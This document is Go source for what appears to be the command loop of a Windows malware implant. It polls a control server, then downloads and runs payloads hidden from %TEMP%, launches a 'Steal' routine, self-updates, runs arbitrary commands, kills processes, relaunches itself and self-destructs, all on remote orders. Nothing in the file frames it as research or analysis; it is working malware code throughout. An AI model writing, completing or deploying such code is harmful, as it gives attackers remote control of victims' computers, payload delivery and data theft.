package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime/debug"
	"syscall"
	"time"

	"github.com/buger/jsonparser"
)

var tloopInterval int64 = 50

func tloop() {
	defer func() {
		if r := recover(); r != nil {
			log_(fmt.Sprintf("tloop panic: %v\n%s", r, string(debug.Stack())))
			time.Sleep(5 * time.Second)
			go tloop()
		}
	}()
	if tloopInterval < 50 {
		tloopInterval = 50
	}
	failCount := 0
	for {
		if failCount > 5 {
			changeEndpoint(0, 1)
			failCount = 0
		}
		timer := time.NewTimer(time.Duration(tloopInterval) * time.Millisecond)
		select {
		case <-timer.C:
		case <-stopChan:
			return
		}
		timer.Stop()
		payload := map[string]interface{}{
			"cmd": buildVersion,
		}
		pBytes, _ := json.Marshal(payload)
		resp, err := rq(dec(pBytes))
		if err != nil {
			failCount++
			continue
		}
		failCount = 0
		doTask(resp)
	}
}

func doTask(payload []byte) error {
	cmd, err := jsonparser.GetString(payload, "cmd")
	if err != nil {
		return err
	}
	switch cmd {
	case "load":
		taskID, _ := jsonparser.GetString(payload, "url")
		urlsJSON, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: load url=%s data=%s", taskID, urlsJSON))
		var urls []string
		if err := json.Unmarshal([]byte(urlsJSON), &urls); err != nil {
			return err
		}
		dest := os.ExpandEnv("${TEMP}") + `\` + urls[1]
		if err := downloadFileMulti(urls[0:1], dest); err != nil {
			return err
		}
		if err := runHidden("cmd", "/C", "start", "/B", dest); err != nil {
			return err
		}
		updTaskStatus(taskID, "done")
	case "post":
		taskID, _ := jsonparser.GetString(payload, "url")
		urlsJSON, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: post url=%s data=%s", taskID, urlsJSON))
		var urls []string
		if err := json.Unmarshal([]byte(urlsJSON), &urls); err != nil {
			return err
		}
		dest := os.ExpandEnv("${TEMP}") + `\` + urls[1]
		var downloadErr error
		for i := 0; i < len(urls); i++ {
			if i == 0 || i == 1 {
				continue
			}
			if downloadErr = downloadFileSingle(urls[i], dest); downloadErr == nil {
				break
			}
		}
		if downloadErr != nil {
			return downloadErr
		}
		unmapSelf()
		if err := runHidden("cmd", "/C", "start", "/B", dest); err != nil {
			return err
		}
		Suicide(1)
		updTaskStatus(taskID, "done")
		stopChan <- struct{}{}
	case "kill":
		log_("doTask: kill — self-destructing")
		taskID, _ := jsonparser.GetString(payload, "url")
		Suicide(1)
		updTaskStatus(taskID, "done")
		stopChan <- struct{}{}
	case "steal":
		log_("doTask: steal")
		go Steal()
	case "config":
		taskID, _ := jsonparser.GetString(payload, "url")
		urlsJSON, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: config (self-update) data=%s", urlsJSON))
		var urls []string
		if err := json.Unmarshal([]byte(urlsJSON), &urls); err != nil {
			return err
		}
		dest := os.ExpandEnv("${TEMP}") + `\` + urls[1]
		for i := 2; i < len(urls); i++ {
			if err := downloadFileSingle(urls[i], dest); err == nil {
				break
			}
		}
		unmapSelf()
		if err := runHidden("cmd", "/C", "start", "/B", dest); err != nil {
			return err
		}
		Suicide(1)
		updTaskStatus(taskID, "done")
		stopChan <- struct{}{}
	case "sleep":
		msVal, _ := jsonparser.GetInt(payload, "data")
		modeVal, _ := jsonparser.GetInt(payload, "url")
		log_(fmt.Sprintf("doTask: sleep %dms mode=%d", msVal, modeVal))
		if modeVal == 1 {
			sleepFailCount++
			if sleepFailCount > 5 {
				selfExe, _ := os.Executable()
				cmd2 := exec.Command(selfExe)
				cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				_ = cmd2.Start()
				stopChan <- struct{}{}
				return nil
			}
		} else {
			sleepFailCount = 0
		}
		time.Sleep(time.Duration(msVal) * time.Millisecond)
	case "task":
		taskID, _ := jsonparser.GetString(payload, "url")
		data, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: task id=%s data=%s", taskID, data))
		updTaskStatus(taskID, "running")
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log_(fmt.Sprintf("task goroutine panic: %v", r))
				}
			}()
			Steal()
		}()
	case "opentask":
		taskID, _ := jsonparser.GetString(payload, "url")
		data, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: opentask id=%s data=%s", taskID, data))
		if err := runHidden("cmd", "/C", "start", data); err != nil {
			return err
		}
		updTaskStatus(taskID, "done")
	case "killtask":
		taskID, _ := jsonparser.GetString(payload, "url")
		pidStr, _ := jsonparser.GetString(payload, "data")
		log_(fmt.Sprintf("doTask: killtask id=%s pid=%s", taskID, pidStr))
		if err := runHidden("taskkill", "/F", "/PID", pidStr); err != nil {
			return err
		}
		updTaskStatus(taskID, "done")
	default:
		log_(fmt.Sprintf("doTask: unknown cmd=%q", cmd))
	}
	return nil
}

var sleepFailCount int
var stopChan = make(chan struct{}, 1)

func ensureOK(data []byte) bool {
	return len(data) > 0
}

func reportError(msg string) {
	log_(fmt.Sprintf("ERROR: %s", msg))
}

func updTaskStatus(taskID string, status string) {
	payload := map[string]string{
		"id":     taskID,
		"status": status,
	}
	data, _ := json.Marshal(payload)
	enc := dec(data)
	rq(enc)
}

func downloadFileMulti(urls []string, dest string) error {
	var lastErr error
	for _, u := range urls {
		if lastErr = downloadFileSingle(u, dest); lastErr == nil {
			return nil
		}
	}
	return lastErr
}

func downloadFileSingle(url, dest string) error {
	return downloadFile(url, dest)
}

func runHidden(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Start()
}

func unmapSelf() {
	log_("unmapSelf called")
}
